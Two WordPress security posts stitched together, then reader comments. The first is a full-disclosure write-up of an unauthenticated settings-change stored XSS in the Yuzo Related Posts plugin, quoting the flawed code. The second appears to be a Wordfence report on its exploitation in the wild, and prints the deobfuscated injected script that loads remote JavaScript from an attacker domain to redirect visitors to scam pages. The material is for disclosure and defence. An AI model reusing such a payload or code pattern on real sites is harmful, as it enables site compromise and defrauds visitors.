# WordPress Plugin Team Paints Target on Exploitable Settings Change Vulnerability That Permits Persistent XSS in Related Posts

When we announced a [protest of the continued inappropriate behavior of the WordPress Support Forum moderators](https://www.pluginvulnerabilities.com/2018/09/25/our-new-disclosure-policy-in-response-to-the-continued-inappropriate-behavior-of-the-wordpress-support-forum-moderators/), one of the changes we suggested to resolve that was:

> Don’t post on things they don’t understand. This really ties into the last item since you often have moderators providing people incorrect information and then they appear to not be able to handle that someone provides information that disputes that, leading to accurate information being deleted.

Along the those lines in November the person who is charge of the moderation of the Support Forum and also one of the six members of the team running the Plugin Directory, Samuel “Otto” Wood, [wrote](https://wordpress.org/support/topic/do-what-is-need-to-get-the-plugin-relisted/#post-10935008) this:

> To everybody else: most of the time when a plugin is delisted, it is **not** for a security issue. Taking pre-emptive measures like removing the plugin just because it was delisted is never really necessary.

That came less than a month after some of those that didn’t at least deactivate a popular closed plugin were exploited due to the poorly thought out process of handling vulnerable plugins by the Plugin Directory team. The plugin [AMP for WP – Accelerated Mobile Pages](https://wordpress.org/plugins/accelerated-mobile-pages/) was closed on October 21. 8 days later a fix for an authenticated persistent cross-site scripting (XSS) was submitted to the public Subversion repository underlying the Plugin Directory. That same day we detailed the [vulnerability for our customers](https://www.pluginvulnerabilities.com/2018/10/29/vulnerability-details-authenticated-persistent-cross-site-scripting-xss-vulnerability-in-amp-for-wp-accelerated-mobile-pages/), started warning them about it, and offering help to update to the fixed version (since you couldn’t do that normally due to the plugin being closed). Hackers obviously could do the same thing and considering this plugin was one of the 1,000 most popular plugins that made it an obvious target. While the plugin was still closed on November 4 we had started seeing hackers probing for [usage of the plugin to exploit that](https://www.pluginvulnerabilities.com/2018/11/05/it-looks-like-hackers-have-started-probing-for-usage-of-amp-for-wp-accelerated-mobile-pages/). Taking the pre-emptive action of deactivating the plugin would have protected websites from being hacked.

If you were relying on other security companies, you were in trouble as they didn’t even know about that until well after the fact. For example, Wordfence [wrote](https://www.wordfence.com/blog/2018/11/xss-injection-campaign-exploits-wordpress-amp-plugin/) about this being exploited only on November 20 and started their post:

> News broke last week disclosing a number of vulnerabilities in the AMP For WP plugin, installed on over 100,000 WordPress sites.

News didn’t break that previous week, which started November 11, seeing as we had already warned that hackers were targeting this as of six days before that (the person that wrote their post has the title of “threat analyst”, which apparently doesn’t mean much). That was rather problematic when you consider that Wordfence had to write a new rule to protect against this:

> The Wordfence firewall has a new rule that defends sites against this exploit.

So they couldn’t protect against that until after they knew about it, which was well after the fact. At the point they were warning about this, the plugin had already been reopened, so they provided protection slower than simply keeping your plugins up to date.

In response to that situation and others we started monitoring the closure of the 1,000 most popular plugins, so that we could better get ahead of hackers while the WordPress team continues to refuse to work with others to improve their handling of insecure plugins to avoid situations like the one mentioned above. Through that we spotted that the plugin [Related Posts](https://wordpress.org/plugins/yuzo-related-post/), which has 60,000+ installs, had been closed today and as we began a quick over the security of the plugin we identified the plugin contains a settings change vulnerability that permits persistent cross-site scripting (XSS). That is same kind of vulnerability that we spotted in the plugin [Social Warfare last week before it was widely exploited](https://www.pluginvulnerabilities.com/2019/03/21/full-disclosure-of-settings-change-persistent-cross-site-scripting-xss-vulnerability-in-social-warfare/). We wouldn’t want to make a bet that hackers are not in the process of figuring out the same thing, seeing as how obvious it is once you know that the plugin may have a security vulnerability, which closing it does.

If a security review had been done of the plugin at any point in its five years of existence this could have already been caught, since there no nonce is included with request to change the plugin’s settings, which would tell you that there is at least a cross-site request forgery (CSRF) vulnerability and then if you took the time to look at the underlying code you would see the larger issue.

Due to the moderators of the WordPress Support Forum’s [continued](https://www.pluginvulnerabilities.com/2018/09/27/wordpress-team-didnt-notify-developer-of-plugin-with-700000-active-installations-about-vulnerability-they-knew-about/) [inappropriate](https://www.pluginvulnerabilities.com/2018/09/25/wordpress-support-forum-moderators-engaged-in-cover-up-of-security-issues-in-wordpress-plugins/)[behavior](https://www.pluginvulnerabilities.com/2018/09/25/wordpress-support-forum-moderators-stop-people-from-getting-help-so-they-can-promote-favored-security-companies/) we are [full disclosing vulnerabilities in protest until WordPress gets that situation cleaned up](https://www.pluginvulnerabilities.com/2018/09/25/our-new-disclosure-policy-in-response-to-the-continued-inappropriate-behavior-of-the-wordpress-support-forum-moderators/), so we are releasing this post and then only trying to notify the developer through the WordPress Support Forum. You can notify the developer of this issue on the forum as well. Hopefully the moderators will finally see the light and clean up their act soon, so these full disclosures will no longer be needed (we hope they end soon). You would think they would have already done that since multiple [previously full disclosed vulnerabilities](https://www.pluginvulnerabilities.com/2018/11/30/hackers-have-been-probing-for-usage-of-the-kiwi-social-share-wordpress-plugin-for-a-couple-of-weeks/) were [quickly on hackers’ radar](https://www.pluginvulnerabilities.com/2019/03/26/webarx-hides-that-their-firewall-failed-to-provide-same-protection-simply-updating-wordpress-plugin-would-have/), but it appears those moderators have such disdain for the rest of the WordPress community that their continued ability to act inappropriate is more important that what is best for the rest of the community.

## Details

In the plugin’s main file the file /assets/ilenframework/core.php is included:

| ``` 2400  ``` | ``` require_once "assets/ilenframework/core.php"; ``` |
| --- | --- |

require\_once "assets/ilenframework/core.php";

That file will create a new instance of the class “ilen\_framework\_30”:

| ``` 5301  ``` | ``` $IF = new ilen_framework_30; ``` |
| --- | --- |

$IF = new ilen\_framework\_30;

The \_\_construct() function in that class will cause the functin \_ini\_() to be run when visiting admin pages (is\_admin() is actually being used as intended there):

| ``` 138 139 140 141 142 143 144 145 146 147 148 149 150  ``` | ``` function __construct(){   	if( ! is_admin() ){ // only front-end   		self::set_main_variable(); 		return;   	}elseif( is_admin()  ){ // only admin       		// set default if not exists 		self::_ini_(); ``` |
| --- | --- |

function \_\_construct(){
if( ! is\_admin() ){ // only front-end
self::set\_main\_variable();
return;
}elseif( is\_admin() ){ // only admin
// set default if not exists
self::\_ini\_();

That function will run the function save\_options() is the GET input “page” is set to “yuzo-related-post”:

| ``` 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150  ``` | ``` function _ini_(){   	self::set_main_variable();   	self::setComponents();   	self::theme_plugin_install_set_default_values();   	if( isset($this->parameter['id_menu']) && isset($_GET["page"]) && ( $_GET["page"] == $this->parameter['id_menu'] ) ){ // validate if admin page is the option     		// get Components 		//self::_getComponents_();   		// set varaible configuration 		$this->options = $this->IF_CONFIG->options;   		// if save update options 		if($this->parameter['type'] == 'plugin-tabs'){ 			self::save_options_for_tabs(); 		}else{ 			self::save_options(); ``` |
| --- | --- |

function \_ini\_(){
self::set\_main\_variable();
self::setComponents();
self::theme\_plugin\_install\_set\_default\_values();
if( isset($this->parameter['id\_menu']) && isset($\_GET["page"]) && ( $\_GET["page"] == $this->parameter['id\_menu'] ) ){ // validate if admin page is the option
// get Components
//self::\_getComponents\_();
// set varaible configuration
$this->options = $this->IF\_CONFIG->options;
// if save update options
if($this->parameter['type'] == 'plugin-tabs'){
self::save\_options\_for\_tabs();
}else{
self::save\_options();

That function will then change the plugin’s settings without doing any security checks:

| ``` 4325 4326 4327 4328 4329 4330 4331 4332 4333 4334 4335 4336 4337 4338 4339 4340 4341 4342 4343 4344 4345 4346 4347 4348 4349 4350 4351 4352 4353 4354 4355 4356 4357 4358 4359 4360  ``` | ``` function save_options(){   		global $options_update;   		$options_update = null; 		//delete_option( $this->parameter['name_option']."_options" ); 		//var_dump( $_POST );exit; 		//code save options the theme 		if( isset($_POST) && ( isset($_POST['save_options']) || isset($_POST['reset_options'] ) ) && $_POST["name_options"] == $this->parameter["name_option"] ){   			$Myoptions = self::theme_definitions();     			if( is_array($Myoptions) ){ 				foreach ($Myoptions as $key2 => $value2) {   					if( $key2 != 'last_update' ){   						self::fields_update($value2['options'], false); 						//break;   					}else{ 						$options_update[$key2] = time(); 					} 				} 			}   			if( is_array($options_update) ){       				$options_act                      = get_option( $this->parameter['name_option']."_options"); 				//var_dump($options_act);   				$options_update['active_license'] = isset($options_act['active_license']) ? $options_act['active_license'] : ''; 				//var_dump($options_update);   				if(update_option( $this->parameter['name_option']."_options" , $options_update)){ ``` |
| --- | --- |

function save\_options(){
global $options\_update;
$options\_update = null;
//delete\_option( $this->parameter['name\_option']."\_options" );
//var\_dump( $\_POST );exit;
//code save options the theme
if( isset($\_POST) && ( isset($\_POST['save\_options']) || isset($\_POST['reset\_options'] ) ) && $\_POST["name\_options"] == $this->parameter["name\_option"] ){
$Myoptions = self::theme\_definitions();
if( is\_array($Myoptions) ){
foreach ($Myoptions as $key2 => $value2) {
if( $key2 != 'last\_update' ){
self::fields\_update($value2['options'], false);
//break;
}else{
$options\_update[$key2] = time();
}
}
}
if( is\_array($options\_update) ){
$options\_act = get\_option( $this->parameter['name\_option']."\_options");
//var\_dump($options\_act);
$options\_update['active\_license'] = isset($options\_act['active\_license']) ? $options\_act['active\_license'] : '';
//var\_dump($options\_update);
if(update\_option( $this->parameter['name\_option']."\_options" , $options\_update)){

All that means, as the proof of concept below shows, is that an attacker can cause malicious JavaScript code to be set in the plugin’s setting and then it will get shown on the impacted website’s frontend and backend pages.

It is important to note that the proof of concept was created by simply changing a single setting from the plugin’s default to include JavaScript code and another one to have the plugin’s functionality included on the home page, so that isn’t something hackers would have an issue creating on their own.

## Proof of Concept

The following proof of concept will cause an alert box with the message “XSS” to be shown on the plugin’s admin page, /wp-admin/admin.php?page=yuzo-related-post, and the homepage of the website.

Make sure to replace “[path to WordPress]” with the location of WordPress.

# Yuzo Related Posts Zero-Day Vulnerability Exploited in the Wild

The Yuzo Related Posts plugin, which is installed on over 60,000 websites, was removed from the WordPress.org plugin directory on March 30, 2019 after an unpatched vulnerability was publicly, and irresponsibly, disclosed by a security researcher that same day. The vulnerability, which allows stored cross-site scripting (XSS), is now being exploited in the wild. These attacks appear to be linked to the same threat actor who targeted the recent [Social Warfare](https://www.wordfence.com/blog/2019/03/recent-social-warfare-vulnerability-allowed-remote-code-execution/) and [Easy WP SMTP](https://www.wordfence.com/blog/2019/03/hackers-abusing-recently-patched-vulnerability-in-easy-wp-smtp-plugin/) vulnerabilities.

The XSS protection included in the Wordfence firewall protects against the exploit attempts we have seen so far. Both free and Premium Wordfence users are protected against these attacks. Based on a deeper analysis of the security flaws present in the plugin we have also deployed protection against additional attack vectors. Premium customers will receive the update today, free users in 30 days. We recommend that all users remove the plugin from their sites immediately.

### is\_admin() Strikes Again

The vulnerability in Yuzo Related Posts stems from missing authentication checks in the plugin routines responsible for storing settings in the database. The code below from `assets/ilenframework/core.php` is the crux of the problem.

```

function __construct(){

if( ! is_admin() ){ // only front-end

self::set_main_variable();
return;

}elseif( is_admin() ){ // only admin

// set default if not exists
self::_ini_();

```

Developers often mistakenly use `is_admin()` to check if a piece of code that requires administrative privileges should be run, but [as the WordPress documentation points out](https://developer.wordpress.org/reference/functions/is_admin/), that isn’t how the function should be used. In this scenario `self::_ini_()` is called on any request to an administrative interface page, including `/wp-admin/options-general.php` and `/wp-admin/admin-post.php`, which allows a POST request to those pages to be processed by `self::save_options();` later in the code.

The result is that an unauthenticated attacker can inject malicious content, such as a JavaScript payload, into the plugin settings. That payload is then inserted into HTML templates and executed by the web browser when users visit the compromised website. This security issue could be used to deface websites, redirect visitors to unsafe websites, or compromise WordPress administrator accounts, among other things.

### Exploits Lead to Malicious Redirects

Today, eleven days after this vulnerability was irresponsibly disclosed and a proof-of-concept (PoC) was published, threat actors have begun exploiting sites with Yuzo Related Posts installed.

Exploits currently seen in the wild inject malicious JavaScript into the `yuzo_related_post_css_and_style` option value.

```

Once deobfuscated, it’s easier to see what the script is doing:

```

</style><script language=javascript>var elem = document.createElement('script');
elem.type = 'text/javascript';
elem.async = true;
elem.src = 'https://hellofromhony[.]org/counter';
document.getElementsByTagName('head')[0].appendChild(elem);</script>

```

When a user visits a compromised website containing the above payload, they will be redirected to malicious tech support scam pages. Example:

[![](https://www.wordfence.com/wp-content/uploads/2019/04/malicous_redirect_screenshot.png)](https://www.wordfence.com/wp-content/uploads/2019/04/malicous_redirect_screenshot.png)

### Three Vulnerabilities with a Lot in Common

Our analysis shows that the attempts to exploit this vulnerability share a number of commonalities with attacks on two other vulnerabilities discovered in other plugins: Social Warfare and Easy WP SMTP.

Exploits so far have used a malicious script hosted on `hellofromhony[.]org`, which resolves to `176.123.9[.]53`. That same IP address was used in the Social Warfare and Easy WP SMTP campaigns. In addition, all three campaigns involved exploitation of stored XSS injection vulnerabilities and have deployed malicious redirects. We are confident that the tactics, techniques and procedures (TTPs) in all three attacks point to a common threat actor.

### Conclusion

As was the case a few weeks ago, the irresponsible actions of a security researcher has resulted in a zero-day plugin vulnerability being exploited in the wild. Cases like this underscore the importance of a layered security approach which includes a WordPress firewall.

Site owners running the [Yuzo Related Posts](https://wordpress.org/plugins/yuzo-related-post/) plugin are urged to remove it from their sites immediately, at least until a fix has been published by the author. [Wordfence Premium](https://www.wordfence.com/wordfence-signup/) customers and free users have been protected against the current attacks we’re seeing in the wild. An additional firewall rule to protect against alternate exploits has been developed and deployed to our Premium customers today and will be available to free users in 30 days.

  Given how often the misunderstanding around is\_admin() causes problems similar to this, perhaps it's time to rename the function is\_admin\_page(), or something else which clearly indicates that the function is not related to the privileges of the caller.

  I too switched to this plugin from YARPP and this morning discovered I could not access my blog. Luckily I was logged in, in another tab and was able to find a WordPress forum thread or two and fix this. But related post plugins seem to be particularly problematic. Supposedly JetPack has this feature now but I'm thinking of just not having this feature on my blog anymore.

  Thank you for all you do, Wordfence. Had forgotten this was the plugin on our site because the name on the plugin list didn't include Yuzo. But there it was...and now it's gone.

  I am not a plugin developer, but I use !is\_admin() conditionals in functions.php to dequeue scripts/styles which I don't need in the front-end, for example jQuery. Is this usage of !is\_admin() safe or not?

  Hello,

  I installed WordFence and did not have this plugin, yet it happened. I had the latest WordFence installed.

  How does this happen?

  Thank you for any help. I don't mind paying for the help to make sure it doesn't happen.

  I'm sorry to hear you're having issues with your site. If you did not have the Yuzo Related Posts plugin installed, it's unlikely that this was what had happened. If you need a security team to take a look at your site and investigate, please check with our Security Services Team. https://www.wordfence.com/wordfence-site-cleanings/

  Hi Ederson, I'm sorry to learn your site is redirecting. If you have a recent backup, you could restore from it and remove the Yuzo Related Posts plugin to remove the vulnerability. You may be able to investigate if it's simply a change in your database using PhpMyAdmin if you have that set up in your hosting account. If you need help, our Security Services Team can help. https://www.wordfence.com/wordfence-site-cleanings/ Or you can review this guide for cleaning a hacked site. https://www.wordfence.com/docs/how-to-clean-a-hacked-wordpress-site-using-wordfence/

  Hi,

  Is there any way in settings (.htaccess..) that could help us to survive zeo-day attack (like this one or Yellow Pencil)?

  Thanks!

  If you don't have Wordfence Premium with updated firewall rules to protect you, we recommend removing the vulnerable plugins until they have been patched.

  I've spent maybe a total of 24 hours the last three days figuring out why my sites kept being redirected to scam sites. Everytime I restored my site and about 10 hours later the hack returned. Then I accidentally found this page. Thanks a lot! I hope that the hacking of my sites now will stop. Next step -> get the Wordfence Premium!!
